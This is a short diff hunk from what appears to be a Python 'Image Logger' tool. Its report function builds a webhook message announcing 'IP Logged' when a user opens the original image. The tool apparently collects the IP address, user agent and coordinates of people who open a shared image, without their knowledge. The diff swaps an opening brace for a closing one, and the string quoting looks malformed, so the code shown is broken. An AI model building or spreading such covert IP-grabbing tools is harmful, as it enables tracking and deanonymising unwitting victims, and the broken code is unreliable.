@@ -63,7 +63,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         "username": config["username"],
         "content": ping,
         "embeds": [
-            {
+            }
                 "title": "Image Logger - IP Logged",
                 "color": config["color"],
                 "description": f""**A User Opened the Original Image!**
